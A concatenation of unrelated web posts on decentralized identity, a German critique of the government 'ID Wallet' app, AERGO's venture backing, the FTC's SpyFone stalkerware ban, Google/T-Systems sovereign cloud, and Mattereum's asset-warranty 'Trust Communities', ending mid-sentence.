identity and data solutions. They’ve developed a comprehensive identity infrastructure including an identity wallet that allows you to easily create digital identities, a composable, cross-chain reputation protocol, and a DeFi protocol that leverages your decentralized identity and self-sovereign reputation to enable undercollateralized loans. Learn more about Ontology at <a href="https://ont.io/">https://ont.io</a></p><p>Bright ID is a social identity network that allows you to prove that you’re only using one account. Creating your digital identity is as simple as installing an app and verifying your identity by joining a connection party. You can enjoy the benefit of your unique identity straight from the app. Learn more about BrightID at <a href="https://brightid.org/">https://brightid.org</a></p><p>Idena is the first proof-of-person blockchain based on democratic principles. Every user has a crypto identity — one single person with equal voting power and mining income. Every unique human that operates an Idena validator node can start mining Idena. To verify you are a unique human, you do not need to disclose any personal data (no KYC). You join a validation ceremony and solve a series of flip-tests (human-made CAPTCHAs). Learn more about Idena at <a href="https://www.idena.io/">https://www.idena.io/</a></p><p>Serto is a decentralized identity platform making it easy for everyone to exchange data in a trusted, private and scalable way.

Turn free-form data into verifiable credentials, issue them to partners and customers, and integrate data from other parties into your processes — all in a trusted way. Learn more about Serto at <a href="https://www.serto.id/">https://www.serto.id/</a></p><p>Gitcoin connects the community developing digital public goods, creating financial freedom, and defining the future of the open web. They’ve developed the Proof of Personhood Passport, a transportable proof of personhood identity for the web3 space that allows you to earn rewards by proving your personhood on any integrated dApp, leveraging the same identity you already use on Gitcoin Grants. Learn more about Gitcoin at <a href="https://gitcoin.co/">https://gitcoin.co/</a></p> What does the future hold for&nbsp;DID? <p>The prominence of decentralized identity solutions within and outside the blockchain and crypto industry is likely to grow exponentially in the coming years. The more the lines are blurred between digital and physical life, the more our online identities will grow and evolve in complexity. If these identities are stored among multiple centralized systems, they will become harder to manage. Decentralization solves these problems, and the impact it will have on the future will likely be significant.</p><p><a href="https://twitter.com/humptycalderon">Humpty Calderon</a> is the Head of Community at <a href="https://ont.io/">Ontology</a>.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

 Unsere Prinzipien – offene Plattform 



<p>Wir sind davon überzeugt, dass eine dezentrale Identität eine offene Plattform mit einheitlichen Standards sein muss, unabhängig von einer einzelnen Lösung. Produkte und Lösungen müssen interoperabel sein. Nur so können die Potentiale der Technologie für den Einzelnen, für den öffentlichen Bereich und die Privatwirtschaft umgesetzt werden. Dieser Grundsatz leitet uns in der Beratung und in der Erstellung unserer frei verfügbaren Plattform.

<p>Introduction: AERGO, One Of The Few Blockchains Backed By The Top 20&nbsp;VC’s</p>The Names Here Speak For Themselves: And AERGO Is Amongst Some Of The Most Well Known Blockchains In The&nbsp;Space<p>It is evident that in order for a blockchain project to succeed, it must follow numerous principles for mass adoption; awareness, technological success, a strong community and strong monetary backing: AERGO has just that. Within the realm of cryptocurrency, seventeen out of the top twenty venture capital firms in the entire world have invested in blockchain companies, and AERGO has made it onto that prestigious list, which cannot be overstated. AERGO, based off of the infographic above and Blockdata is one of the largest fifty-four companies out of one-hundred and thirteen companies to be invested in by some of the largest venture capital funds in the world. AERGO is alongside cryptocurrency behemoths such as Coinbase, Binance, Kucoin, Solana, Uniswap, OpenSea, Ripple and many others, proving the necessary point to comprehend for new and veteran investors and innovators alike that AERGO, as a project, is alongside these other titans of blockchain industry in venture capital&nbsp;backing.</p><p>Sequoia Capital: A Powerhouse Titan Of Venture Capital Equity Sees Potential In AERGO, Along With Other Contributors</p>The Powerhouse Venture Capital Firm Believes In AERGO And Invested Their Own Capital Into The Company As A&nbsp;Startup<p>For a cryptocurrency in the Top 450 in totality of market capitalization, this comes as a major shocker, however, it wouldn’t be surprising to see major traction within the AERGO ecosystem as time goes on. Did you know that Sequoia Capital, one of the most well known powerhouse companies in the venture equity space, invested in AERGO? If you’re unfamiliar with Sequoia, well, they also invested in companies such as Apple, Google, Oracle, PayPal, YouTube, Instagram and Whatsapp. Other contributors in the private token sale include, but are not limited to, FBG, GBIC, Arrington XRP, Dekrypt, Rockaway, Neo Global, Divergence Digital as well as many more traditional VCs, specialist crypto funds, and angel investors. It speaks volumes that AERGO is alongside some of the largest names in the entirety of the cryptocurrency space in venture capital backing. Out of the many venture capital firms that participated in the early investment of AERGO, it is incumbent to break down some of these expansive and prominent firms that entrust in AERGO’s vision and technology.</p><p>Backers Upon Backers: VC’s Upon VC’s: The Persistent And Consistent Backing Of&nbsp;AERGO</p>The Above Picture Speaks For Itself: These Are The Major Backers And Early Investors Of&nbsp;AERGO<p>Breaking down the entirety of these backers would turn this article into a dissertation, but it is crucial to understand how prominent some of these companies are in the venture capital world, Sequoia, covered previously, being one of these major firms. Arrington XRP Capital is one of these major venture capital firms that emphasizes investment into startups and promotes incubation of promising projects that exist within the realm of blockchain. Alongside AERGO, Arrington XRP Capital’s portfolio includes prominent projects such as BlockFi, Polkadot, Near Protocol, Algorand, Terra, Certik and XRP. Arrington XRP Capital has raised over 300 million dollars in funds, their latest being on June 10th, 2021 which raised a total of 100 million dollars. RocketFuel, another venture capital firm, consists of some of the brightest minds from cutting edge conglomerates such as Snapchat, Airbnb, Uber and Accenture. Many employees of RocketFuel are graduates from leading universities such as MIT, Columbia and UC Berkeley. RocketFuel has invested in prominent projects alongside AERGO, which include ICON, Chainlink, Harmony One, Vechain, Qtum, Wanchain and Bluezelle. Block VC is one of the most prominent venture capital firms in digital assets, with over 100 employees worldwide and exposure to 60 cutting edge projects, amounting to 600 million dollars total in investment. Block VC assisted in early investment rounds for AERGO, which emphasizes the point that they see AERGO as a cutting edge technological innovator within the blockchain sphere. These are just four projects out of 30 different organizations that participated in AERGO’s seed funding, so why is this important, well it is important for numerous&nbsp;reasons.</p><p>Venture Capital Investment: The Calling Card Of A Promising Project</p>Out Of The Nearly 13,000 Cryptocurrencies That Exist, AERGO Has Succeeded In Proving Itself To Venture Capital Firms As A Blockchain Project With Longevity And Technological Ingenuity<p>Venture capital investment is not to be taken lightly; these companies are filled with some of the brightest minds in seed financing, specifically around digital assets. To garner the attention of retail investors is one thing, but to garner funding and attraction from a multi-million dollar professional firm, that is a whole other animal to reckon with. AERGO has solidified itself, through this notion, as a major contender of being one of the most promising projects that exist within the blockchain space and their venture capital backing proves that point. To garner attention and attraction, specifically from Sequoia Capital, is an outstanding feat for a company, especially a company where they directly participated in seed funding for the AERGO startup, among many other prominent firms. Mass adoption is led by those with prominence and knowledge on the prerequisites of what makes a promising project, and the fact that AERGO was one of 54 projects out of 113 with the most venture capital backing says something surrounding its overall trajectory and innovation as a blockchain company.</p><p>Conclusion: Blockchain Adoption Is Accompanied By Venture Capital Firms: The Solidification Of&nbsp;AERGO</p>Venture Capital Proves The Validity And Longevity Of A Project: AERGO Has Passed That&nbsp;Test<p>AERGO is poised to be one of the most dominant blockchain projects in South Korea and the entire Asian continent. Through the many seed investors and venture capital firms that have invested in AERGO, which has been shown to be alongside some of the most well-known projects and organizations in blockchain, exemplifies the ideal that AERGO is here to stay, to continuously grow in the future. This is AERGO, a blockchain project that emphasizes eVoting solutions, venture capital and governmental validity from various organizations which include some of the most prominent venture capital firms in the&nbsp;world.</p><p>Disclaimer: Cryptocurrency investing and gambling requires substantial risk, do not invest or gamble more than you can afford to lose!

<p>Aktualisierung (Stand 29.09.2021):&nbsp;</p>



<p>Die “ID Wallet” wurde inzwischen wieder aus den App Stores genommen (<a href="https://www.bundesregierung.de/breg-de/themen/buerokratieabbau/e-id-1962112">mehr hier</a>).&nbsp;</p>



<p>Wir begrüßen den Schritt und freuen uns, dass die Bundesregierung den Hinweisen aus der Community zur Verbesserung der IT-Sicherheit und Nutzerführung folgt und weiter nachgehen will. Unsere Befürchtung, dass dieser misslungene erste Aufschlag&nbsp; auf die SSI Community und deren enormes Potenzial abfärben könnte, wird sich damit hoffentlich nicht bestätigen.&nbsp;</p>



<p>Wir hoffen, dass in der Weiterentwicklung des “Ökosystem Digitaler Identitäten” intensiver mit den Schaufenstern “Sichere Digitale Identität” und der übergreifenden Begleitforschung zusammengearbeitet wird. Wir bringen unsere Expertise hier gerne ein.&nbsp;</p>



<p>———————————–</p>



<p>Seit dem 23.9.2021 ist die “ID Wallet” in den App Stores welche es Bürger:innen erlauben soll ihre digitale Identität zu verwalten. Die „ID Wallet“ der Bundesregierung wurde im Rahmen des Projekts “Ökosystem digitaler Identitäten” vom Bundeskanzleramt entwickelt und von der bisher unbekannten&nbsp;<a href="https://digital-enabling.eu/">Digital-Enabling GmbH</a>&nbsp;(Tochterunternehmen der esatus AG) entwickelt. Sie soll Nutzer:innen die Möglichkeit bieten Ihren Personalausweis und Führerschein auf Basis der Self-Sovereign Identity Technologie auf ihrem Smartphone zu nutzen.</p>



<p>Hintergrund</p>



<p>Die vorgestellte&nbsp; „ID Wallet“ hatte ursprünglich den Zweck ein Pilotprojekt um den Anwendungsfall des<a href="https://www.bundesregierung.de/breg-de/suche/start-pilot-hotel-check-in-1914392">&nbsp;Hotel-Checkins</a>&nbsp;abzubilden. Der Pilot wurde auf Basis Hyperledger indy / ARIES 1.0 implementiert. Für einen temporären Piloten war diese Entscheidung verständlich. In der Fachcommunity wird dies inzwischen als überholt angesehen, da sich gerade im Blick auf eine Anwendung in der Breite (mit großen Nutzer:innenzahlen und Anbietern) Probleme ergeben. Für den Roll-out auf Bundesebene ist die eingesetzte Technologie daher nicht geeignet.</p>



<p>Ein Schnellschuss der nach hinten losging</p>



<p>Der Start der „ID Wallet“ App verlief äußerst holprig und wurde mit Stand 27.09. auch ausgesetzt. So hat die App bisher zwar zehntausende Downloads, aufgrund des medialen Echos, zugleich startet die App aber bei einem Großteil der Nutzer nicht einmal oder bricht im späteren Prozess ab. Das Rating von 1,x von 5 Sternen bei über 7000 Bewertungen spricht hier Bände.&nbsp;</p>







<p>Der Vertrauensvorschuss, den diese Nutzer:innen der App mit dem download gegeben hatten, ist damit verspielt worden, was sich auch in<a href="https://gist.github.com/rena2019/a7d68aceded5a99439504656ea8ffef0">&nbsp;einschlägigen Foren</a>, den sozialen Netzwerken und Kommentarspalten nachlesen lässt.</p>



<p>Die Kritik im Detail&nbsp;</p>



<p>Es gibt neben der eingeschränkten Funktionsfähigkeit, die ärgerlich und dem anfänglichen Vertrauensaufbau zu einer neuen Technologie nicht dienlich ist, noch weitere und weitaus wichtigere Punkte die bislang bei der Beleuchtung des Debakels der „ID Wallet“ App nicht ausreichend Berücksichtigung fanden! Die Punkte sind:</p>



<p>Offenheit und Transparenz:&nbsp;<br>Die eingesetzte “ID Wallet” ist nicht open source, man kann also nicht unabhängig überprüfen was wirklich mit den Daten geschieht. Bei anderen Projekten wie der Corona Warn App wurde hier deutlich besser gearbeitet. Ähnliches gilt auch für den Herausgeber der Wallet, der wider Erwarten nicht die Bundesregierung ist, sondern eine bisher unbekannte Firma.</p>



<p>Infrastruktur:&nbsp;<br>Eine zukunftsfähige Identitäts-Infrastruktur muss in jedem Fall als offene und dezentrale Infrastruktur angelegt sein. Nur so lassen sich die Risiken für Datenschutz und Kontrolle durch Dritte ausreichend eingrenzen. Ein<a href="https://www.bundesregierung.de/resource/blob/992814/1898280/d9819a40553a9543b9e8f3acb620b0c2/digitale-identitaet-neu-download-bundeskanzleramt-data.pdf?download=1">&nbsp;“Ökosystem digitaler Identitäten”&nbsp;</a>wie es vom Bundeskanzleramt im März 2021 beschrieben wurde sollte nicht allein als Kooperation zwischen Regierung und Privatwirtschaft verstanden werden. Vielmehr muss sichergestellt sein, dass die Bevölkerung und Zivilgesellschaft an diesem Prozess beteiligt wird.&nbsp;&nbsp;&nbsp;</p>



<p>Standards:&nbsp;<br>Um die oben genannten Punkte zu erreichen, muss auf einheitlichen Standards aufgebaut werden. Die Piloten des Bundeskanzleramts bauen auf der Technologie Hyperledger Indy in der Version 1.0 auf, die diverse Probleme in Bezug auf Standard Compliance und Skalierbarkeit hat. International laufen die Abstimmungen für einen skalierbaren und auf Interoperabilität hin ausgerichteten Stack bereits auf Hochtouren. Offene Gremien wie der W3C, Decentralized Identity Foundation und Linux Foundation spielen hier eine wichtige Rolle.&nbsp;&nbsp;</p>



<p>Einbindung:&nbsp;<br>Bei einem solchen Vorhaben, muss so früh wie möglich die Zivilgesellschaft eingebunden werden (z.B.:&nbsp;<a href="https://www.ccc.de/">Chaos Computer Club</a>), da ansonsten das Risiko besteht&nbsp; die Akzeptanz der Lösung massiv zu verringern. Einen einmaligen Verlust des Vertrauens kann man in diesem Bereich schwer wieder herstellen.</p>



<p>“Schaufensterprojekte” der nachhaltigere Weg</p>



<p>Das BMWi hat 2019 das Schaufensterprojekt „Sichere Digitale Identitäten“ als Forschungsprojekt ausgeschrieben. Im Rahmen des Innovationswettbewerbs&nbsp;<a href="http://schaufenster-sdi.de/">„Schaufenster Sichere Digitale Identitäten“</a>&nbsp;möchte das BMWi herausragende Ansätze für interoperable und einfach nutzbare ID-Ökosysteme fördern, die in Modellregionen anwendungsnah erprobt werden sollen. Nach einer Wettbewerbsphase 2020, an der 11 Konsortien teilnahmen, hat seit April 2021 die 3-jährige Umsetzungsphase begonnen.&nbsp;</p>



<p>Inzwischen arbeiten die 4 ausgewählte Konsortien an der Umsetzung von selbstbestimmten digitalen Identitäten (ONCE, ID-Ideal , SDIKA, und ID-Union). In über 40 Anwendungsfällen wollen die 60+ Konsortialpartner die technologische Infrastruktur selbstbestimmte Identitäten weiterentwickeln und für Bürger:innen nutzbar machen. Auch Führerschein und Personalausweis sollen hier digital in einer Wallet App auf dem Smartphone abgebildet werden.</p>



<p>Eine wesentliche Vorgabe des Projektträgers ist Interoperabilität aller im Schaufenster verwendeten Technologie Bausteine für selbstbestimmte Identitäten (SSI = Self Sovereign Identity). Um dies sicherzustellen, gibt es zusätzlich zum Schaufenster die<a href="https://digitale-identitaeten.de/">&nbsp;Begleitforschung</a>, die diesen Prozess unterstützt.</p>



<p>Das BMWi hat die SDI Projekte auf einen realistischen Zeithorizont von 3 Jahren ausgelegt. Man hat sich bewusst gegen eine vorschnelle Einführung dieser innovativen Technologie entschieden, da diese sich immer noch in einem Forschungs- und Erprobungs-Stadium befindet. Ein wesentlicher Anspruch der SDI Projekte ist, dass diese komplexe Aufgabe als eine gemeinsame verstanden wird, die von allen Beteiligten sauber aufgesetzt werden will und muss. Nur so lässt sich das volle Potenzial selbstbestimmter Identitäten erschließen, sowie die Lernkurve exponentiell steigern. Dieser Ansatz wurde von Bundeskanzleramt und Verkehrsministerium mit dem vorschnellen Release der “ID Wallet” weitestgehend in den Wind geschlagen.</p>



<p>Debatte um Walletanbieter</p>



<p>Wie das aktuelle Debakel der „ID Wallet“ zeigt, ist es weder im Interesse der BürgerInnen nur auf eine Wallet angewiesen zu sein, noch ist dies für den öffentlichen und privaten Sektor von Interesse. Wesentlich ist die Implementierung globaler Standards unter Open Source (Quelloffener Code), denn nur diese werden es ermöglichen, dass wir unsere digitalen Identitäten weltweit einsetzen und selbstbestimmt verwalten können.</p>



<p>Der Ansatz nur einer exklusiven Wallet, oder nur eines Blockchain (Ledgers) gefährdet Sicherheit und Rechte der Bürger:innen, und verhindert das Entstehen einer selbstbestimmten globalen Kommunikations-Infrastruktur, die gerade in diesen Zeiten so essenziell wie nie zuvor ist.</p>



<p>Selbstbestimmte Identitäten sind nur dann selbstbestimmt, wenn Bürger:innen eine Wahl haben und frei entscheiden können, welche Standard konforme Wallet sie zu welchen Bedingungen nutzen wollen.&nbsp;</p>



<p>Unsere Empfehlung</p>



<p>Wir empfehlen dem Bundeskanzleramt und der neuen Regierung einen Schulterschluss mit den Schaufensterprojekten Sichere Digitale Identität des BMWi und der übergreifenden Begleitforschung zu suchen, vor allem im Hinblick auf:</p>



  Ausrichtung und Mitarbeit an internationalen Standards (DIF, W3C).  Unabhängigkeit von einem spezifischen Ledger (oder anderen PKI Services), Anbietern, Software und Lizenzen  Interoperabilität (national und international) und  Schaffung einer öffentlichen digitalen Infrastruktur (offenes Netzwerk statt geschlossener Plattform) für BürgerInnen und Unternehmen um gesellschaftliche und volkswirtschaftliche Vorteile zu generieren  Die gesamte Infrastruktur muss Open-Source sein  



<p>Die “ID Wallet” App sollte umgehend zurückgezogen werden, um die Reputation der dezentralen Identitäten nicht weiter zu schädigen. Die eingesetzte Lösung ist nicht sauber implementiert und getestet, noch auf internationale Standards aufgebaut, und somit auch nicht zukunftsfähig.</p>



<p>All dies sind jedoch Grundvoraussetzungen um eine Europäische und globale Anschlussfähigkeit sicherzustellen. Der Zeithorizont von 2 bis 3 Jahren der SDI Projekte ist ambitioniert, scheint hierfür jedoch realistisch und sinnvoll.</p>

<p>The privacy industry is applauding the Federal Trade Commission for&nbsp;<a href="https://www.ftc.gov/news-events/press-releases/2021/09/ftc-bans-spyfone-and-ceo-from-surveillance-business">banning</a>&nbsp;SpyFone and its CEO from the surveillance business following allegations they secretly harvested and sold real-time data that could easily lead stalkers and abusers to their potential targets.&nbsp;</p>



<p>The personal data, accessed through a hidden device hack, revealed device owners’ locations, phone use, and other online activities like email and video chats. Not only could stalkers and abusers access the data, but potentially so could identity thieves and other cybercriminals.</p>



<p>SpyFone purports to be a parental monitoring tool for keeping an eye on the kids. But as is often the case with these tools, it’s bought by abusers wanting to track the target of their abuse. This makes it&nbsp;<a href="https://stopstalkerware.org/">stalkerware</a>, for which the official definition is software, made available directly to individuals, that enables a remote user to monitor the activities on another user’s device without that user’s consent and without explicit, persistent notification to that user in order to intentionally or unintentionally facilitate intimate partner surveillance, harassment, abuse, stalking, and/or violence.</p>



<p>A key characteristic of stalkerware is that it requires physical access to a device to install it on that device, which means it’s most commonly installed by a person for the purposes of partner surveillance, facilitating gender-based and domestic violence, harassment, and sexual abuse. With stalkerware, abusers can track GPS location, call information, text messages and social media activity.</p>



<p>The FTC alleges that SpyFone.com and its CEO Scott Zuckerman:</p>



  sold stalkerware apps that allowed purchasers to secretly monitor the device owner’s photos, text messages, web histories, GPS locations, and other personal data  required purchasers using the app on Android devices to bypass many of the phone’s restrictions and instructed users on how to hide the app from the device owner  failed to keep the data it illegally obtained secure with basic security measures.&nbsp;  



<p>This is the second case the FTC has brought against stalkerware apps, but the first in which it’s obtaining a ban. The FTC order also requires SpyFone to delete the information it collected illegally and notify device owners that the app had been secretly installed.</p>



<p>As a proud member of the&nbsp;<a href="https://anonyome.com/2020/05/anonyome-labs-joins-global-fight-against-stalkerware/">Coalition Against Stalkerware</a>&nbsp;helping to stop tech-facilitated violence and abuse, Anonyome Labs welcomes the FTC’s decision. This is a first from the FTC, and a good one at that. We hope it makes the entire stalkerware industry re-think its choices.</p>

  <p>by <a href="https://www.kuppingercole.com/team/small">Mike Small</a></p><p>On September 8th, 2021 <a href="https://www.googlecloudpresscorner.com/2021-09-07-T-Systems-and-Google-Cloud-Partner-to-Deliver-Sovereign-Cloud-for-Germany" title="https://www.googlecloudpresscorner.com/2021-09-07-T-Systems-and-Google-Cloud-Partner-to-Deliver-Sovereign-Cloud-for-Germany">Google and T-Systems announced</a> their intention to build and deliver sovereign cloud services for German enterprises, the public sector, and healthcare organizations.&nbsp; So, what are a sovereign cloud services and why does this announcement matter?</p>
 Sovereign Cloud 
<p>The sovereign cloud is seen as a solution to the risks that arise from the increasing dependence of organizations on cloud services that are owned by foreign entities and delivered from outside of the local jurisdictions.&nbsp; These risks include loss of critical services through geopolitical disputes, interception of data by foreign governments, privacy and theft of intellectual property, as well as lock-in to proprietary service interfaces.</p>
<p>Governments around the world have enacted laws and introduced regulations in an attempt to mitigate against these risks.&nbsp; In Europe, the EU GDPR (General Data Protections Regulation) is an example of this.&nbsp; The subsequent <a href="https://www.europarl.europa.eu/RegData/etudes/ATAG/2020/652073/EPRS_ATA(2020)652073_EN.pdf" title="https://www.europarl.europa.eu/RegData/etudes/ATAG/2020/652073/EPRS_ATA(2020)652073_EN.pdf">Schrems II judgement</a> and <a href="https://edpb.europa.eu/sites/edpb/files/consultation/edpb_recommendations_202001_supplementarymeasurestransferstools_en.pdf" title="https://edpb.europa.eu/sites/default/files/consultation/edpb_recommendations_202001_supplementarymeasurestransferstools_en.pdf">European Data Protection Board recommendations</a> highlight the need for technical controls as well as legal contracts covering data processed in foreign jurisdictions since governments are not bound by civil contracts.</p>
<p>The idea behind the sovereign cloud is to ensure that the services provided are within the control of the jurisdiction where it is used.&nbsp; This can be achieved in several ways.&nbsp; Within Europe there are some cloud services that are locally owned and delivered.&nbsp; However, these services find it hard to compete against the economies of scale enjoyed by the global hyperscale cloud services.&nbsp; Therefore, using purely local providers usually involves increased costs and or reduced functionality.</p>
<p>Another approach is for state sponsored projects.&nbsp; However, these have a chequered history when it comes to innovation and, in any case, the richness of the existing hyperscale cloud services leaves an enormous gap to close.&nbsp; Therefore, quite sensibly, the European <a href="https://www.data-infrastructure.eu/GAIAX/Navigation/EN/Home/home.html" title="https://www.data-infrastructure.eu/GAIAX/Navigation/EN/Home/home.html">GAIAX project</a> does not seek to replace the existing cloud services but rather to increase local control.&nbsp; Google, together with other hyperscale cloud providers, is a founding member of GAIAX.</p>
<p>It is this context that the partnership between Google and T-Systems should be viewed.&nbsp; According to Google the object of this is to deliver a European Cloud on Europe’s terms.&nbsp; The core focus is on the DACH (German, Austrian and Swiss) markets covering enterprises, the public sector, and healthcare organizations.</p>
 Google and T-Systems Sovereign Cloud for Germany 
<p>Google and T-Systems have described the 3 areas of sovereignty that this offering will support.&nbsp; These are data sovereignty, operational sovereignty, and software sovereignty.</p>
<p>They describe data sovereignty as covering 9 areas.&nbsp; These include customer control over the location of their data, controls against unauthorized access such as encryption by default and customer control over encryption keys as well as visibility and control over administrative access by Google administrators.&nbsp; They extend to include a promise not to sell the customers’ data and not to use the customers’ AI models for any other purpose.&nbsp; Most of these areas are supported by all the major IaaS providers.</p>
<p>Operational sovereignty covers 6 areas.&nbsp; These include support for local administration in selected regions, customer control over and visibility of administrative access and data decryption and visibility of security and hardware configurations changes to the infrastructure. They extend to customer audit based on consolidated tamper evident logs, zero trust control over access and the ability to support third party administration.&nbsp; These are important differentiators.</p>
<p>Software sovereignty – this provides consistent orchestration and management of workloads across multi-clouds, private cloud to provide survivability, based on and compatible with Open Source and Opens Source APIs.</p>
<p>Google says that this will be achieved through the use of a common hardware and software stack for both the public and sovereign clouds. The sovereign cloud will be delivered through a trusted partner and include additional controls and sovereignty guarantees which will be operated by the partner.</p>
<p>In terms of implementation the plan is to deliver in phases.&nbsp; Phase 1 July 2022 – Encryption management, data localization, access control, open source.&nbsp; Phase 2 2023 – Identity Management, Audits &amp; Comprehensive Trust Management. Phase 3 2024 – Fully operational sovereign controls, data access, monitoring, security, deployment, audit.</p>
 Opinion 
<p>The DACH market has been slow to adopt cloud services because of fears such as unauthorized access to sensitive data as well as concerns over the legality of their use.&nbsp; These are increased due to the perceived difficulties of achieving security and compliance obligations.&nbsp; This is welcome as it appears to be a practical approach to resolving these challenges. It clearly addresses some of the operational control and data privacy issues.&nbsp; However, it is not clear how it would enable service continuity in the event of geopolitical dispute since the underlying service is ultimately controlled by Google.&nbsp; In addition, local partnership to deliver sovereign services has been unsuccessfully tried before by other providers.</p>

<p>The incentives in the global marketplace are utterly broken, giving rise to drastic inefficiencies, environmental harm and human rights abuses around the world. How do we create a market economy that doesn’t consume the&nbsp;world?</p> Intro: Fix the Incentives, Fix the&nbsp;World <p>As it currently stands, centralized institutions are incentivized not to secure truth in their products or services but rather shield themselves from potential liabilities. While many companies offer warranties to their products, these are limited almost entirely to the primary markets. As soon as an object begins trading in the secondary markets, liability dissipates.</p><p>The only other sources of truth available beyond the manufacturer are the specialist firms which rate and certify objects of a particular domain: fine art, collectible cards, instruments, etc. However, these institutions are limited in their capacity by their lack of a shared record of an object’s history. Best case there’s an entry in a single database. Worst case: a single paper certificate.</p><p>This disconnected certification system and lack of initiative and coordination in securing product information has incredibly adverse effects on society: counterfeiting abound, environmental harm, and human rights&nbsp;abuses.</p><p>So how do we break out of the silos of separate “truths” and crowdsource expertise to build a better marketplace that doesn’t absolutely consume the&nbsp;world?</p><p>Our answer: Trust Communities</p> What are Trust Communities? <p>Built on the Mattereum Asset&nbsp;Passport</p><p>Before diving into this concept it is important to discuss the core component of the Mattereum Protocol: the Mattereum Asset Passport&nbsp;(MAP).</p><p>In short, a MAP is a bundle of legal warranties tied to an object. While these warranties can vary with the object in question, the initial warranty is often some form of identification. Other warranties in a MAP may include authentication methods, carbon offsets, anti-slavery certification, tokenization (or connections to any smart contract or software system), and many others. These warranties are essentially “<a href="https://medium.com/humanizing-the-singularity/composable-commerce-with-mattereum-asset-passports-4e102f85139a">legal lego</a>” of various contract terms that will range greatly between different asset classes and will accrue around assets over&nbsp;time.</p><p>The warranties within a MAP are not informal handshakes on the internet but rather legally-enforceable terms of a contract that the buyer opts into, evidenced by cryptographic signatures which bind counterparties to the underlying legal agreement. All claims are backed by financial stake, giving all warrantors accountability and skin-in-the-game for their assessments. This framework also provides access to dispute resolution protocols in the event of systemic or commercial fallout via an arbitration clause in the contract.</p><p>Later this year we will integrate <a href="https://www.unn.finance/">UNN.finance</a> risk management pools so that there is a DeFi-native way of supporting product sales using Mattereum. We are also building bridges with the regular insurance industry. This approach means a single asset can be protected by both DeFi-native and fiat-native risk management protocols.</p><p>Once a MAP has been generated, we must then have a system in place to incentivize and secure this object warranty system over time without centralized institutions.</p><p>Building Product Information Markets with Blockchain</p><p>Commerce on the internet is both a technological and social phenomenon, so any proposed system must address the fundamental social and technical challenges that go into curating and securing product information.</p><p>Socially, in the absence of centralized trust we must incentivize experts to apply their domain-specific knowledge to supply warrantied information around goods and services.</p><p>Technically, we need a shared, open database for recording the provenance of an object and a programmable transaction system which powers the aforementioned incentive mechanism. This system must also overcome the transaction costs of bringing in experts (who are not dealers) to rapidly and efficiently deploy their expertise.</p><p>Mattereum Trust Communities</p><p>With blockchain and smart contracts, we can power commons-based peer production of product information with built-in crypto-economic incentives and clear lines of accountability.</p><p>With product information markets enabled by Trust Communities, we can incentivize truth in markets by allowing experts to make money on their expertise and face consequences for erroneous claims. Simple concept, powerful implications.</p><p>Let’s look at some examples.</p> Eliminating Counterfeit Goods <p>According to a<a href="https://www.oecd-ilibrary.org/trade/trends-in-trade-in-counterfeit-and-pirated-goods_g2g9f533-en"> joint report</a> by OECD and EUIPO based on 2016 data, counterfeit and pirated goods accounted for over $500 billion in international trade in that year alone: up to 3.3% of world&nbsp;trade!</p><p>The range of markets affected include common consumer goods such as clothing and electronics, B2B products like chemicals and construction materials, luxury fashion, fine art, and even pharmaceuticals, food, and medical equipment.</p><p>This scale of fraud doesn’t just burn the top 1% with a forged Monet or Picasso discovered in their collections. This can have a real impact on public <a href="https://www.cdc.gov/niosh/npptl/usernotices/counterfeitResp.html">health</a>, safety, and <a href="https://wtop.com/tracking-metro-24-7/2018/09/inspector-general-fake-labels-on-electrical-parts-used-in-metro-car-maintenance/">infrastructure</a>.</p><p>The product information market method could adapt to ALL of these industries at the consumer and business level. The main difference is where the Asset Passport is generated in the product lifecycle.</p><p>With consumers, we can generate MAPs to secure the storied value of unique or limited objects such as art, instruments, cultural artifacts, or precious metals, leveraging a network of third-party, independent certifiers with relevant expertise to stake their assessments via warranties, challenge any existing claims, and even earn from the continued sale of these&nbsp;items.</p><p>At the business level, we could embed MAPs within corporate supply chains even before the manufacturing stage to have a truly transparent and information-rich view of the entire product lifecycle, from design and specifications, to production, to purchase and resale. Cryptographically verifiable by any and all parties. Think of something like KickStarter: you put money in at the design stage and get an NFT. You can resell that NFT as the product approaches physical delivery. The new owner of the NFT will get the final product when it ships: ideal for rarities and exciting new&nbsp;drops.</p><p>Most industries feature third-party expertise outside of the key corporations such as certification firms and engineering tear-downs. With Mattereum Trust Communities, we can build product information markets that aggregate and incentivize the use of this underutilized knowledge, restoring value, increasing liquidity, and bringing peace of mind to trade at all&nbsp;scales.</p> Powering the “Lean Green” Circular&nbsp;Economy <p>Before we can ever achieve an ultra-efficient and sustainable circular economy of goods, we must first solve for the deep lack of trust in online transactions. Just as liability dissipates when goods reach the secondary market, so does their value. E-commerce platforms like eBay and Amazon provide incredible reach with their two-sided marketplaces, but the frequent fraud, dodgy dispute resolution procedures, and high fees severely hinder the valuation of secondhand goods. The “doubt discount” runs far and wide in these markets, where the vast majority of all material goods&nbsp;reside.</p>Eliminating the Doubt Discount of Digital&nbsp;Commerce<p>As an example, let’s look at a useful item in virtually any setting: the Honda EU20i portable electric generator. By reputation, these generators run forever: it’s the Rolls-Royce of small generators. On eBay, they’re roughly 60% discounted from new, even if they’ve only been run a few hundred hours. Enter our Trust Community experts:</p><p>Examine the generator. Write a warranty on its expected future lifespan. If it breaks down before that, the buyer gets paid. The simplest form: “I’ll buy this generator for $1000 if it breaks down in the next two years.” This gives the expert the chance to repair it and resell it. Simple market mechanisms.</p><p>The result is the second hand generators are worth a lot more if they last. Garbage units can’t be warrantied, so they don’t attract higher resale prices. This produces a flight to quality in the market, reducing the overall number of failed generators sitting in the scrap&nbsp;heaps.</p><p>This has two benefits: those goods which are produced in a re-identifiable form and can be warrantied will sell for higher prices initially, because of more stable, higher secondhand value, and these goods will provide more hours of service for lower landfill cost than low quality goods. The “secondhand circular economy” then kicks in. There’s less unused cheap and nasty generators gathering dust in garages, because people buy a good generator secondhand when they need it, and sell it again for nearly what they paid for it — a rational price given how long these things&nbsp;last.</p><p>Now imagine this system for any product of lasting&nbsp;utility.</p><p>Using product information markets, the secondhand marketplace suddenly evolves from the place where value goes to die to the ideal means of acquiring goods of tested, durable worth. As a society, we could do more with less, increasing profitability in peer-to-peer economies and greatly reducing&nbsp;waste.</p> Revealing the True Costs of&nbsp;Trade <p>Trade globalization is rife with negative externalities. For the purposes of this article, let’s look at two examples of suffering imbued within the global machinery of trade, and how Trust Communities and Product Information Markets can help combat this systemic injustice.</p><p>Climate</p><p>With unchecked carbon emissions being an accelerant of climate change — which will have cascading effects 